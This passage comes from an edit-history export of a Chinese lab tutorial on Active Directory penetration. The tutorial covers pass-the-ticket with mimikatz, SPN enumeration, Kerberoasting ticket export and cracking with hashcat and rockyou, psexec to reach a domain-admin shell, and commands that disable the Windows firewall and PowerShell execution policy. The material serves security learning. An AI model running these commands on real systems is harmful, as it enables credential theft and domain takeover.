[https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)\n- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)\n- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)\n- [什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\n\n## 录制的视频教程\n- [域渗透实践篇（四）](https://www.bilibili.com/video/BV1ve411s7Qd)\n1. pass the ticket\n\n- [域渗透实践篇（五）]()\n1. kerberoasting\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n### 获取到域管理员权限之后\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell\n\n## 搜集spn信息\n```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n```",[[1588303983037,["whale@Whale",[[1,1836,"\n\n"]],[1836,1836],[1837,1837]]],[1588303991899,["whale@Whale",[[-1,1837,"\n"],[1,1838,"## windows不允许执行powershell"]],[1837,1837],[1862,1862]]],[1588303992144,["whale@Whale",[[1,1862,"\n\n"]],[1862,1862],[1863,1863]]],[1588303992488,["whale@Whale",[[1,1864,"\n"]],[1863,1863],[1864,1864]]],[1588303992968,["whale@Whale",[[1,1864,"`Set-ExecutionPolicy Unrestricted`"]],[1864,1864],[1898,1898]]],[1588303993744,["whale@Whale",[[1,1899,"\n"]],[1898,1898],[1899,1899]]],[1588304003394,["whale@Whale",[[1,1863,"yun"]],[1863,1863],[1866,1866]]],[1588304004143,["whale@Whale",[[-1,1863,"yun"]],[1866,1866],[1863,1863]]],[1588304011984,["whale@Whale",[[1,1863,"运行powershell脚本使劲啊"]],[1863,1863],[1880,1880]]],[1588304012924,["whale@Whale",[[-1,1877,"使劲啊"]],[1880,1880],[1877,1877]]],[1588304015256,["whale@Whale",[[1,1877,"时间\t，"]],[1877,1877],[1881,1881]]],[1588304016240,["whale@Whale",[[-1,1879,"\t，"]],[1881,1881],[1879,1879]]],[1588304016748,["whale@Whale",[[-1,1878,"间"]],[1879,1879],[1878,1878]]],[1588304017261,["whale@Whale",[[1,1878,"，"]],[1878,1878],[1879,1879]]],[1588304589162,["whale@Whale",[[1,1879,"y"]],[1863,1879],[1879,1880]]],[1588304589367,["whale@Whale",[[1,1880,"u"]],[1879,1880],[1879,1881]]],[1588304589697,["whale@Whale",[[1,1881,"'h"]],[1879,1881],[1879,1883]]],[1588304590312,["whale@Whale",[[-1,1881,"'h"]],[1879,1883],[1879,1881]]],[1588304590931,["whale@Whale",[[1,1881,"'d"]],[1879,1881],[1879,1883]]],[1588304591053,["whale@Whale",[[1,1883,"a"]],[1879,1883],[1879,1884]]],[1588304591170,["whale@Whale",[[1,1884,"o"]],[1879,1884],[1879,1885]]],[1588304591516,["whale@Whale",[[-1,1879,"yu'dao"],[1,1885,"遇到"]],[1879,1885],[1879,1881]]],[1588304592554,["whale@Whale",[[1,1881,"“”"]],[1881,1881],[1883,1883]]],[1588304597873,["whale@Whale",[[1,1882,"无法加载文件"]],[1882,1882],[1888,1888]]],[1588304726721,["whale@Whale",[[1,1888,"，因为在此系统禁止执行脚本"]],[1888,1888],[1901,1901]]],[1588304758143,["whale@Whale",[[1,1903,"\n"]],[1902,1902],[1903,1903]]],[1588304759752,["whale@Whale",[[1,1904,"\n"]],[1903,1903],[1904,1904]]],[1588304770772,["whale@Whale",[[1,1904,"在powershell面板下输入，"]],[1904,1904],[1921,1921]]],[1588304771967,["whale@Whale",[[-1,1921,"\n"]],[1921,1921],[1921,1921]]],[1588304778761,["whale@Whale",[[1,1955,"，再输入“”"]],[1955,1955],[1961,1961]]],[1588304780727,["whale@Whale",[[1,1960,"Y"]],[1960,1960],[1961,1961]]],[1588304781975,["whale@Whale",[[1,1962,","]],[1962,1962],[1963,1963]]],[1588304783032,["whale@Whale",[[-1,1962,","]],[1963,1963],[1962,1962]]],[1588304789419,["whale@Whale",[[1,1962,"，即可运行ps脚本"]],[1962,1962],[1971,1971]]],[1588304852958,["whale@Whale",[[1,1780,"\n"]],[1780,1780],[1781,1781]]],[1588304853358,["whale@Whale",[[1,1781,"\n"]],[1781,1781],[1782,1782]]],[1588304855146,["whale@Whale",[[1,1780,"---"]],[1780,1780],[1783,1783]]],[1588304856990,["whale@Whale",[[1,1785,"\n"]],[1784,1784],[1785,1785]]],[1588304862460,["whale@Whale",[[1,1785,"powersploit"]],[1785,1785],[1796,1796]]],[1588304869847,["whale@Whale",[[1,1796,"中，脚本PowerVe"]],[1796,1796],[1807,1807]]],[1588304870269,["whale@Whale",[[-1,1806,"e"]],[1807,1807],[1806,1806]]],[1588304875832,["whale@Whale",[[1,1806,"iew做信息搜集"]],[1806,1806],[1814,1814]]],[1588304980115,["whale@Whale",[[1,1779,"，"]],[1779,1779],[1780,1780]]],[1588304988263,["whale@Whale",[[1,1780,"这台"]],[1780,1780],[1782,1782]]],[1588304988846,["whale@Whale",[[-1,1780,"这台"]],[1782,1782],[1780,1780]]],[1588305008872,["whale@Whale",[[1,1780,"这条命令向域控查询信息，所以需要有域控服务器"]],[1780,1780],[1802,1802]]],[1588305031781,["whale@Whale",[[1,1895,"\n"]],[1894,1894],[1895,1895]]],[1588305039645,["whale@Whale",[[1,1895,"## spn服务主体名称是什么"]],[1895,1895],[1910,1910]]],[1588305039916,["whale@Whale",[[1,1911,"\n"]],[1910,1910],[1911,1911]]],[1588305152492,["whale@Whale",[[1,1901,"“"]],[1901,1901],[1902,1902]]],[1588305156709,["whale@Whale",[[1,1908,"”"]],[1908,1908],[1909,1909]]],[1588313420741,["whale@Whale",[[1,1913,"服务帐户利用SPN支持Kerberos身份验证。"]],[1913,1913],[1937,1937]]],[1588313421022,["whale@Whale",[[1,1938,"\n"]],[1937,1937],[1938,1938]]],[1588313421278,["whale@Whale",[[1,1939,"\n"]],[1938,1938],[1939,1939]]],[1588313428958,["whale@Whale",[[1,1940,"\n"]],[1937,1937],[1938,1938]]],[1588313429414,["whale@Whale",[[1,1941,"\n"]],[1938,1938],[1939,1939]]],[1588313430162,["whale@Whale",[[-1,1941,"\n"]],[1939,1939],[1938,1938]]],[1588313430408,["whale@Whale",[[-1,1940,"\n"]],[1938,1938],[1937,1937]]],[1588313432562,["whale@Whale",[[1,1937,"九十四"]],[1937,1937],[1940,1940]]],[1588313433306,["whale@Whale",[[-1,1937,"九十四"]],[1940,1940],[1937,1937]]],[1588313445296,["whale@Whale",[[1,1937,"也就是说，当客户端需要访问服务端"]],[1937,1937],[1953,1953]]],[1588313445910,["whale@Whale",[[-1,1950,"服务端"]],[1953,1953],[1950,1950]]],[1588313481371,["whale@Whale",[[1,1950,"sever提供的服务的时候，那么就需要使用spn查询有哪些服务。"]],[1950,1950],[1982,1982]]],[1588313483437,["whale@Whale",[[1,1985,"\n"]],[1982,1982],[1983,1983]]],[1588313483653,["whale@Whale",[[1,1986,"\n"]],[1983,1983],[1984,1984]]],[1588313488026,["whale@Whale",[[1,1984,"这种spn扫描是"]],[1984,1984],[1992,1992]]],[1588313488411,["whale@Whale",[[-1,1991,"是"]],[1992,1992],[1991,1991]]],[1588313491101,["whale@Whale",[[1,1991,"，是正常的，"]],[1991,1991],[1997,1997]]],[1588313499724,["whale@Whale",[[1,1997,"在内网中"]],[1997,1997],[2001,2001]]],[1588313703470,["whale@Whale",[[1,1641,"\n"]],[1640,1640],[1641,1641]]],[1588313704369,["whale@Whale",[[1,1641,"```"]],[1641,1641],[1644,1644]]],[1588313705478,["whale@Whale",[[1,1736,"```"]],[1736,1736],[1739,1739]]],[1588315191590,["whale@Whale",[[1,2008,"，客户端想要访问服务器的资源，都需要想DCy"]],[2008,2008],[2030,2030]]],[1588315191897,["whale@Whale",[[-1,2029,"y"]],[2030,2030],[2029,2029]]],[1588315212592,["whale@Whale",[[1,2029,"域控查询服务主体名称。就好像上火车要查询列车编号一样。"]],[2029,2029],[2056,2056]]],[1588315228347,["whale@Whale",[[1,2058,"## 如何查询spn"]],[2058,2058],[2068,2068]]],[1588315228424,["whale@Whale",[[1,2069,"\n"]],[2068,2068],[2069,2069]]],[1588315228744,["whale@Whale",[[1,2070,"\n"]],[2069,2069],[2070,2070]]],[1588315236855,["whale@Whale",[[-1,1751,"```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n```"]],[1751,1901],[1751,1751]]],[1588315238790,["whale@Whale",[[1,1920,"```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n```"]],[1920,1920],[2070,2070]]],[1588315242432,["whale@Whale",[[-1,1740,"## 搜集spn信息\n"]],[1740,1751],[1740,1740]]],[1588315242743,["whale@Whale",[[-1,1740,"\n"]],[1740,1740],[1739,1739]]],[1588327290228,["whale@Whale",[[1,2055,"\n"]],[2054,2054],[2055,2055]]],[1588327291232,["whale@Whale",[[1,2055,"---"]],[2055,2055],[2058,2058]]],[1588327291462,["whale@Whale",[[1,2059,"\n"]],[2058,2058],[2059,2059]]],[1588327292031,["whale@Whale",[[1,2060,"\n"]],[2059,2059],[2060,2060]]],[1588327292391,["whale@Whale",[[1,2060,"Add-Type -AssemblyName System.IdentityModel"]],[2060,2060],[2103,2103]]],[1588327293062,["whale@Whale",[[1,2104,"\n"]],[2103,2103],[2104,2104]]],[1588327305734,["whale@Whale",[[1,2104,"New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList"]],[2104,2104],[2187,2187]]],[1588327447926,["whale@Whale",[[1,2187," \"\""]],[2187,2187],[2190,2190]]],[1588327448961,["whale@Whale",[[1,2189,"MSSQLSvc/Srv-DB-0day.0day.org:1433"]],[2189,2189],[2223,2223]]],[1588330530448,["whale@Whale",[[1,2059,"tong"]],[2059,2059],[2063,2063]]],[1588330531272,["whale@Whale",[[-1,2059,"tong"]],[2063,2063],[2059,2059]]],[1588330531901,["whale@Whale",[[1,2059,"tong"]],[2059,2059],[2063,2063]]],[1588330532615,["whale@Whale",[[-1,2060,"ong"]],[2063,2063],[2060,2060]]],[1588330532818,["whale@Whale",[[-1,2059,"t"]],[2060,2060],[2059,2059]]],[1588330544808,["whale@Whale",[[1,2059,"通过spn，申请service ticket"]],[2059,2059],[2081,2081]]],[1588330547294,["whale@Whale",[[1,2247,"\n"]],[2246,2246],[2247,2247]]],[1588330548678,["whale@Whale",[[1,2247,"---"]],[2247,2247],[2250,2250]]],[1588330549069,["whale@Whale",[[1,2251,"\n"]],[2250,2250],[2251,2251]]],[1588330550839,["whale@Whale",[[1,2081,"fu"]],[2081,2081],[2083,2083]]],[1588330551459,["whale@Whale",[[-1,2081,"fu"]],[2083,2083],[2081,2081]]],[1588330554230,["whale@Whale",[[1,2081,"服务票据"]],[2081,2081],[2085,2085]]],[1588330562030,["whale@Whale",[[1,2255,"导出申请的服务票据"]],[2255,2255],[2264,2264]]],[1588330562310,["whale@Whale",[[1,2265,"\n"]],[2264,2264],[2265,2265]]],[1588330566014,["whale@Whale",[[1,2266,"\n"]],[2265,2265],[2266,2266]]],[1588330567012,["whale@Whale",[[1,2266,"---"]],[2266,2266],[2269,2269]]],[1588330567190,["whale@Whale",[[1,2270,"\n"]],[2269,2269],[2270,2270]]],[1588330574745,["whale@Whale",[[1,2270,"爆破服务票据"]],[2270,2270],[2276,2276]]],[1588330590665,["whale@Whale",[[1,2265,"mimikatz.exe \"\""]],[2265,2265],[2280,2280]]],[1588330611289,["whale@Whale",[[1,2279,"kerberos::list /expl"]],[2279,2279],[2299,2299]]],[1588330611752,["whale@Whale",[[-1,2298,"l"]],[2299,2299],[2298,2298]]],[1588330612429,["whale@Whale",[[1,2298,"ort"]],[2298,2298],[2301,2301]]],[1588330643588,["whale@Whale",[[1,2303,"\n"]],[2302,2302],[2303,2303]]],[1588330644276,["whale@Whale",[[1,2303,"da"]],[2303,2303],[2305,2305]]],[1588330644767,["whale@Whale",[[-1,2303,"da"]],[2305,2305],[2303,2303]]],[1588330652088,["whale@Whale",[[1,2303,"导出的票据后缀名kirbi"]],[2303,2303],[2316,2316]]],[1588337286070,["whale@Whale",[[1,2468,"\n"]],[2467,2467],[2468,2468]]],[1588337287557,["whale@Whale",[[-1,2468,"\n"],[1,2469,"### "]],[2468,2468],[2472,2472]]],[1588337288114,["whale@Whale",[[-1,2470,"# "]],[2472,2472],[2470,2470]]],[1588337288443,["whale@Whale",[[1,2470,"c"]],[2470,2470],[2471,2471]]],[1588337288900,["whale@Whale",[[-1,2470,"c"]],[2471,2471],[2470,2470]]],[1588337294036,["whale@Whale",[[1,2470," cmd关闭防火墙"]],[2470,2470],[2479,2479]]],[1588337446959,["whale@Whale",[[1,2479,"\n\n`NetSh Advfirewall` `set` `allprofiles state off`"]],[2479,2479],[2529,2529]]],[1588337447746,["whale@Whale",[[1,2530,"\n"]],[2529,2529],[2530,2530]]],[1588337553661,[null,[[-1,2480,"\n"],[1,2531,"\n"]],[2480,2480],[2532,2532]]],[1588337553661,[null,[[1,2480,"\n"],[-1,2530,"\n"]],[2532,2532],[2480,2480]]],[1588337516056,["whale@Whale",[[1,2530,"`Netsh Advfirewall show allprofiles`"]],[2530,2530],[2566,2566]]],[1588337547913,["whale@Whale",[[1,2567,"\n"]],[2566,2566],[2567,2567]]],[1588337548105,["whale@Whale",[[1,2568,"\n"]],[2567,2567],[2568,2568]]],[1588337548990,["whale@Whale",[[1,2568,"InboundUserNotification               启用"]],[2568,2568],[2608,2608]]],[1588337613654,[null,[[-1,2480,"\n"],[1,2530,"\n"]],[2480,2480],[2531,2531]]],[1588337613654,[null,[[1,2480,"\n"],[-1,2529,"\n"]],[2531,2531],[2480,2480]]],[1588337558963,["whale@Whale",[[-1,2568,"InboundUserNotification               启用"],[1,2608,"netsh firewall set opmode mode=disable"]],[2568,2608],[2606,2606]]],[1588338214671,[null,[[-1,2480,"\n"],[1,2530,"\n"]],[2480,2480],[2531,2531]]],[1588338214671,[null,[[1,2480,"\n"],[-1,2529,"\n"]],[2531,2531],[2480,2480]]],[1588338169365,["whale@Whale",[[1,2302," exit"]],[2265,2302],[2307,2307]]],[1588340564676,[null,[[-1,2485,"\n"],[1,2535,"\n"]],[2485,2485],[2536,2536]]],[1588340564676,[null,[[1,2485,"\n"],[-1,2534,"\n"]],[2536,2536],[2485,2485]]],[1588340542071,["whale@Whale",[[1,2612,"\n"]],[2611,2611],[2612,2612]]],[1588340542277,["whale@Whale",[[1,2613,"\n"]],[2612,2612],[2613,2613]]],[1588340544400,["whale@Whale",[[-1,2613,"\n"],[1,2614,"## yu"]],[2613,2613],[2618,2618]]],[1588340544908,["whale@Whale",[[-1,2616,"yu"]],[2618,2618],[2616,2616]]],[1588340546801,["whale@Whale",[[1,2616,"遇到的问题"]],[2616,2616],[2621,2621]]],[1588340547321,["whale@Whale",[[1,2621,"\n\nImportError: No module named pyasn1.type"]],[2621,2621],[2662,2662]]],[1588340548101,["whale@Whale",[[1,2663,"\n"]],[2662,2662],[2663,2663]]],[1588340554365,["whale@Whale",[[1,2333,"\n"]],[2332,2332],[2333,2333]]],[1588340625682,[null,[[-1,2486,"\n"],[1,2536,"\n"],[-1,2623,"\n"],[1,2665,"\n"]],[2486,2486],[2666,2666]]],[1588340625682,[null,[[1,2486,"\n"],[-1,2535,"\n"],[1,2623,"\n"],[-1,2664,"\n"]],[2666,2666],[2486,2486]]],[1588340567974,["whale@Whale",[[1,2333,"python tgsrepcrack.py  test.txt 1.kirbi"]],[2333,2333],[2372,2372]]],[1588340570885,["whale@Whale",[[1,2662,"\n"]],[2661,2661],[2662,2662]]],[1588340585003,["whale@Whale",[[1,2662,"爆破服务票据密码的时候，py脚本提示"]],[2662,2662],[2680,2680]]],[1588340586837,["whale@Whale",[[1,2723,"\n"]],[2721,2721],[2722,2722]]],[1588340587261,["whale@Whale",[[1,2724,"\n"]],[2722,2722],[2723,2723]]],[1588340597620,["whale@Whale",[[1,2723,"安装一下模块， pip install pyasn1"]],[2723,2723],[2749,2749]]],[1588343367741,[null,[[-1,2525,"\n"],[1,2575,"\n"],[-1,2681,"\n"],[1,2722,"\n"]],[2525,2525],[2723,2723]]],[1588343367741,[null,[[1,2525,"\n"],[-1,2574,"\n"],[1,2681,"\n"],[-1,2721,"\n"]],[2723,2723],[2525,2525]]],[1588343321373,["whale@Whale",[[1,2751,"\n"]],[2750,2750],[2751,2751]]],[1588343322144,["whale@Whale",[[1,2751,"AttributeError: 'file' object has no attribute 'rfind'\r\n"]],[2751,2751],[2807,2807]]],[1588343325596,["whale@Whale",[[1,2751,"\n"],[-1,2805,"\r"]],[2750,2750],[2751,2751]]],[1588343326234,["whale@Whale",[[1,2751,"---"]],[2751,2751],[2754,2754]]]]],["23334b3c-3b49-4a04-a125-18e445098af0",1588402554860,"域渗透入门（三）\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref](https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref)\n- [https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)\n- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)\n- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)\n- [什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\n\n## 录制的视频教程\n- [域渗透实践篇（四）](https://www.bilibili.com/video/BV1ve411s7Qd)\n1. pass the ticket\n\n- [域渗透实践篇（五）]()\n1. kerberoasting\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n### 获取到域管理员权限之后\n```\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell\n```\n## spn“服务主体名称”是什么\n服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。\n\n这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。就好像上火车要查询列车编号一样。\n\n## 如何查询spn\n\n```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n---\n通过spn，申请service ticket服务票据\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/Srv-DB-0day.0day.org:1433\"\n---\n导出申请的服务票据\nmimikatz.exe \"kerberos::list /export\" exit\n导出的票据后缀名kirbi\n---\n爆破服务票据\npython tgsrepcrack.py  test.txt 1.kirbi\n```\n## windows不允许执行powershell\n运行powershell脚本时，遇到“无法加载文件，因为在此系统禁止执行脚本”\n\n在powershell面板下输入，`Set-ExecutionPolicy Unrestricted`，再输入“Y”，即可运行ps脚本\n\n## cmd关闭防火墙\n`NetSh Advfirewall` `set` `allprofiles state off`\n`Netsh Advfirewall show allprofiles`\n\nnetsh firewall set opmode mode=disable\n\n## 遇到的问题\n爆破服务票据密码的时候，py脚本提示\nImportError: No module named pyasn1.type\n\n安装一下模块， pip install pyasn1\n\n---\nAttributeError: 'file' object has no attribute 'rfind'\n\n",[[1588402525261,["whale@Whale",[[1,2755,"\n"]],[2754,2754],[2755,2755]]],[1588402531770,["whale@Whale",[[1,2755,"python tgsrepcrack.py  test.txt 1.kirbi"]],[2755,2755],[2794,2794]]],[1588402532836,["whale@Whale",[[1,2755,"\n"]],[2754,2754],[2755,2755]]],[1588402538897,["whale@Whale",[[1,2755,"运行这条命令的时候，"]],[2755,2755],[2765,2765]]],[1588402540599,["whale@Whale",[[-1,2764,"，"]],[2765,2765],[2764,2764]]],[1588402541237,["whale@Whale",[[-1,2764,"\n"]],[2764,2764],[2764,2764]]],[1588402542771,["whale@Whale",[[1,2764,"·"]],[2764,2764],[2765,2765]]],[1588402543293,["whale@Whale",[[-1,2764,"·"]],[2765,2765],[2764,2764]]],[1588402544012,["whale@Whale",[[1,2764,"`"]],[2764,2764],[2765,2765]]],[1588402544413,["whale@Whale",[[1,2804,"`"]],[2804,2804],[2805,2805]]],[1588402545820,["whale@Whale",[[1,2806,"\n"]],[2805,2805],[2806,2806]]],[1588402549722,["whale@Whale",[[1,2806,"提示："]],[2806,2806],[2809,2809]]],[1588402561578,["whale@Whale",[[1,2809,"TypeError: object of type 'file' has no len()"]],[2809,2809],[2854,2854]]],[1588402567316,["whale@Whale",[[1,2855,"\n"]],[2854,2854],[2855,2855]]],[1588402592780,["whale@Whale",[[1,2809,"\n"]],[2809,2809],[2810,2810]]],[1588402592972,["whale@Whale",[[1,2810,"\n"]],[2810,2810],[2811,2811]]],[1588402594353,["whale@Whale",[[1,2810,"  File \"C:\\python27\\lib\\ntpath.py\", line 115, in splitdrive\r\n    if len(p) > 1:\r\nTypeError: object of type 'file' has no len()"]],[2810,2810],[2936,2936]]],[1588402598341,["whale@Whale",[[-1,2869,"\r"],[-1,2889,"\r"],[-1,2937,"TypeError: object of type 'file' has no len()"]],[2935,2980],[2935,2935]]],[1588403686736,["whale@Whale",[[1,2373,"\n"]],[2372,2372],[2373,2373]]],[1588403694029,["whale@Whale",[[1,2373,"遇到错误，执行失败"]],[2373,2373],[2382,2382]]],[1588403694191,["whale@Whale",[[1,2383,"\n"]],[2382,2382],[2383,2383]]],[1588403695314,["whale@Whale",[[1,2383,"---"]],[2383,2383],[2386,2386]]],[1588403695440,["whale@Whale",[[1,2387,"\n"]],[2386,2386],[2387,2387]]],[1588403710230,["whale@Whale",[[1,2387,"ython /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi"]],[2387,2387],[2489,2489]]],[1588403713800,["whale@Whale",[[1,2387,"p"]],[2387,2387],[2388,2388]]],[1588403715495,["whale@Whale",[[1,2387,"\n"]],[2386,2386],[2387,2387]]],[1588403716130,["whale@Whale",[[1,2387,"con"]],[2387,2387],[2390,2390]]],[1588403716865,["whale@Whale",[[-1,2387,"con"]],[2390,2390],[2387,2387]]],[1588403725607,["whale@Whale",[[1,2387,"从kirbi票据中提取出"]],[2387,2387],[2399,2399]]],[1588403789877,["whale@Whale",[[-1,2393,"票据"]],[2395,2395],[2393,2393]]],[1588403791905,["whale@Whale",[[1,2393,"文件"]],[2393,2393],[2395,2395]]],[1588403793765,["whale@Whale",[[1,2399,"Kerberos tickets"]],[2399,2399],[2415,2415]]],[1588403795726,["whale@Whale",[[1,2520,"\n"]],[2519,2519],[2520,2520]]],[1588403796743,["whale@Whale",[[1,2520,"--"]],[2520,2520],[2522,2522]]],[1588403797022,["whale@Whale",[[1,2523,"\n"]],[2522,2522],[2523,2523]]],[1588403797734,["whale@Whale",[[-1,2523,"\n"]],[2523,2523],[2522,2522]]],[1588403797996,["whale@Whale",[[1,2522,"-"]],[2522,2522],[2523,2523]]],[1588403798271,["whale@Whale",[[1,2524,"\n"]],[2523,2523],[2524,2524]]],[1588406208585,["whale@Whale",[[-1,2355," "]],[2356,2356],[2355,2355]]],[1588412295080,["whale@Whale",[[1,2882,"·"]],[2882,2882],[2883,2883]]],[1588412296420,["whale@Whale",[[-1,2882,"·"]],[2883,2883],[2882,2882]]],[1588412297522,["whale@Whale",[[1,2882,"`"]],[2882,2882],[2883,2883]]],[1588412298378,["whale@Whale",[[1,2901,"`"]],[2901,2901],[2902,2902]]],[1588423562354,["whale@Whale",[[1,83,"\\"]],[83,83],[84,84]]],[1588423563137,["whale@Whale",[[-1,83,"\\"]],[84,84],[83,83]]],[1588423564605,["whale@Whale",[[1,83,"、# 从活动目录获取域管理员权限的各种姿势"]],[83,83],[104,104]]],[1588423566217,["whale@Whale",[[-1,85," "]],[86,86],[85,85]]],[1588423566879,["whale@Whale",[[1,85,"《"]],[85,85],[86,86]]],[1588423567553,["whale@Whale",[[-1,84,"#《"]],[86,86],[84,84]]],[1588423569618,["whale@Whale",[[1,84,"《"]],[84,84],[85,85]]],[1588423571927,["whale@Whale",[[1,103,"》"]],[103,103],[104,104]]],[1588424553327,["whale@Whale",[[1,2544,"hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force"]],[2544,2544],[2612,2612]]],[1588424586554,["whale@Whale",[[1,2539," 》"]],[2539,2539],[2541,2541]]],[1588424587278,["whale@Whale",[[-1,2540,"》"]],[2541,2541],[2540,2540]]],[1588424590801,["whale@Whale",[[1,2540,"> output.txt"]],[2540,2540],[2552,2552]]]]],["d86f7c4e-ea86-4b9e-9042-6830df7fc52d",1588480246341,"域渗透入门（三）\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》、《从活动目录获取域管理员权限的各种姿势》\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref](https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref)\n- [https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)\n- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)\n- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)\n- [什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\n\n## 录制的视频教程\n- [域渗透实践篇（四）](https://www.bilibili.com/video/BV1ve411s7Qd)\n1. pass the ticket\n\n- [域渗透实践篇（五）]()\n1. kerberoasting\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n### 获取到域管理员权限之后\n```\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell\n```\n## spn“服务主体名称”是什么\n服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。\n\n这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。就好像上火车要查询列车编号一样。\n\n## 如何查询spn\n\n```\nsetspn -q 